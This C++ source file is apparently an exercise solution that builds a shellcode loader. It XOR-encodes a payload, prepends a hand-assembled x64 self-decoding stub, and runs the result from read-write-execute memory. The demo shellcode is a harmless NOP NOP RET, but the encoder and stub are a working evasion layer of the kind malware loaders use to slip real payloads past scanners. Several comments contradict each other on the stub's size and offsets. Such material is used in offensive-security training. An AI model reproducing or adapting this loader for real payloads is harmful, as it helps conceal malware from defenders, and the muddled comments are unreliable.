/*
  Solution 04 — XOR Shellcode Encoder with Self-Decoding Stub
  ------------------------------------------------------------
  XOR-encodes shellcode and prepends a small x64 decoder stub that decodes
  the payload in-place then jumps to it. Demonstrates how obfuscation layers
  work in stageless loaders.

  Compile:
    g++ -std=c++17 -Wall -o sol04.exe sol04_shellcode_encoder.cpp
  Usage:
    sol04.exe [key_hex]   # e.g. sol04.exe 42
*/

#include <windows.h>
#include <cstdio>
#include <cstring>
#include <vector>

// ── xorEncode ─────────────────────────────────────────────────────────────────
std::vector<BYTE> xorEncode(const BYTE* sc, size_t len, BYTE key) {
    std::vector<BYTE> out(len);
    for (size_t i = 0; i < len; i++) out[i] = sc[i] ^ key;
    return out;
}

// ── printCArray ───────────────────────────────────────────────────────────────
void printCArray(const char* varName, const std::vector<BYTE>& bytes) {
    printf("BYTE %s[] = {", varName);
    for (size_t i = 0; i < bytes.size(); i++) {
        if (i % 16 == 0) printf("\n    ");
        printf("0x%02X%s", bytes[i], i+1 < bytes.size() ? "," : "");
    }
    printf("\n}; // %zu bytes\n", bytes.size());
}

// ── buildDecodeStub ───────────────────────────────────────────────────────────
// Build a 19-byte x64 stub that:
//   1. Computes payload address (immediately after the stub)
//   2. XOR-decodes all bytes in place
//   3. JMPs to the decoded payload
//
// Assembled bytes:
//   48 8D 0D 0C 00 00 00   lea rcx, [rip+0x0C]  → payload start (7 bytes after instruction = rip+7+0xC-7... recalculate)
//
// The stub is 19 bytes. Payload starts at offset 19 from stub base.
// rip after the lea instruction = stub_base + 7
// We want rcx = stub_base + 19 = rip + 12 = rip + 0x0C  ✓
//
//   48 8D 0D 0C 00 00 00   lea rcx, [rip+0x0C]      (rcx = &payload[0])
//   41 B8 NN NN NN NN       mov r8d, <payload_len>  (loop counter)
//   43 80 34 08 KK          xor byte [rcx+r9], KK   -- wait, use simpler loop:
//
// Simpler working stub (24 bytes):
//   48 8D 0D 10 00 00 00   lea rcx, [rip+16]        rcx = payload (7)
//   45 33 C9               xor r9d, r9d             r9 = 0 = index (3)
//   41 B8 NN NN NN NN       mov r8d, len            (6)
//   80 34 08 KK            xor [rax+rcx], KK  -- no, rax=? use:
//   80 31 KK               xor [rcx], KEY          (3)
//   48 FF C1               inc rcx                  (3)
//   49 FF C8               dec r8                   (3)
//   75 F7                  jnz loop (-9)            (2)
//   48 8D 0D XX 00 00 00   lea rcx, [rip+XX]   jmp rcx -- better use original ptr
//
// Use the cleanest version:
std::vector<BYTE> buildDecodeStub(size_t payloadLen, BYTE key) {
    // 22-byte x64 XOR decode stub.
    // Layout (stub starts at offset 0, payload at offset STUB_SIZE):
    //
    //  00: 48 8D 0D 0F 00 00 00   lea rcx, [rip+0x0F]   → payload[0]  (RIP=7, target=7+15=22)
    //  07: BA LL LL LL LL         mov edx, payload_len
    //  0C: 80 31 KK               xor byte ptr [rcx], KEY
    //  0F: 48 FF C1               inc rcx
    //  12: FF CA                  dec edx
    //  14: 75 F6                  jnz 0x0C  (loop back, offset = -10 = 0xF6)
    //  16: 48 8D 0D XX XX XX XX   lea rcx, [rip+XX]  → payload[0]
    //  1D: FF E1                  jmp rcx
    // Total: 31 bytes
    //
    // After stub (31 bytes), payload is at offset 31.
    // First lea: rip after = 7, want payload at 31 → offset = 31-7 = 24 = 0x18
    // Second lea: at offset 22 (0x16), rip after = 0x1D, want 31 → offset = 31-0x1D = 0x02
    //   Wait: second lea is at offset 0x16, it's 7 bytes so rip = 0x16+7 = 0x1D
    //   Payload at 31 (0x1F), offset = 0x1F - 0x1D = 0x02

    const size_t STUB_SIZE = 31;
    DWORD len32 = (DWORD)payloadLen;

    std::vector<BYTE> stub = {
        // lea rcx, [rip+0x18]   (payload = stub+31, rip=7, 31-7=24=0x18)
        0x48, 0x8D, 0x0D, 0x18, 0x00, 0x00, 0x00,
        // mov edx, payloadLen
        0xBA, (BYTE)(len32), (BYTE)(len32>>8), (BYTE)(len32>>16), (BYTE)(len32>>24),
        // xor byte ptr [rcx], key
        0x80, 0x31, key,
        // inc rcx
        0x48, 0xFF, 0xC1,
        // dec edx
        0xFF, 0xCA,
        // jnz -10 (back to xor instruction at offset 0x0C = 12)
        // Current offset is 0x14 (20). jnz target = 0x0C. delta = 0x0C - (0x14+2) = -10 = 0xF6
        0x75, 0xF6,
        // lea rcx, [rip+0x02]   (rip = 0x1D = 29, payload at 31, offset=2)
        0x48, 0x8D, 0x0D, 0x02, 0x00, 0x00, 0x00,
        // jmp rcx
        0xFF, 0xE1,
    };

    // Sanity: stub should be exactly STUB_SIZE bytes
    if (stub.size() != STUB_SIZE) {
        printf("[-] BUG: stub size %zu != %zu\n", stub.size(), STUB_SIZE);
    }
    return stub;
}

// ── buildPayload = stub + encoded_shellcode ───────────────────────────────────
std::vector<BYTE> buildPayload(const BYTE* sc, size_t len, BYTE key) {
    auto encoded = xorEncode(sc, len, key);
    auto stub    = buildDecodeStub(len, key);

    std::vector<BYTE> payload;
    payload.insert(payload.end(), stub.begin(),    stub.end());
    payload.insert(payload.end(), encoded.begin(), encoded.end());
    return payload;
}

int main(int argc, char* argv[]) {
    BYTE key = 0x42;
    if (argc >= 2) key = (BYTE)strtoul(argv[1], NULL, 16);

    // Test shellcode: NOP NOP RET (x64-safe)
    static const BYTE TEST_SC[] = { 0x90, 0x90, 0xC3 };
    size_t scLen = sizeof(TEST_SC);

    printf("=== XOR Shellcode Encoder Demo ===\n");
    printf("[*] Key: 0x%02X\n", key);
    printf("[*] Original shellcode (%zu bytes):\n    ", scLen);
    for (size_t i = 0; i < scLen; i++) printf("0x%02X ", TEST_SC[i]);
    printf("\n\n");

    // Encode
    auto encoded = xorEncode(TEST_SC, scLen, key);
    printf("[*] Encoded shellcode:\n");
    printCArray("encoded_sc", encoded);
    printf("\n");

    // Build full payload (stub + encoded)
    auto payload = buildPayload(TEST_SC, scLen, key);
    printf("[*] Full payload (%zu bytes = %zu stub + %zu encoded):\n",
           payload.size(), payload.size() - scLen, scLen);
    printCArray("payload", payload);
    printf("\n");

    // Execute to verify the decoder works
    printf("[*] Allocating RWX and executing payload (expected: NOP NOP RET = clean return)...\n");
    LPVOID mem = VirtualAlloc(NULL, payload.size(),
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed: %lu\n", GetLastError()); return 1; }

    memcpy(mem, payload.data(), payload.size());
    FlushInstructionCache(GetCurrentProcess(), mem, payload.size());

    auto fn = (void(*)())mem;
    fn();

    printf("[+] Returned cleanly — decoder stub works!\n");
    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;
}
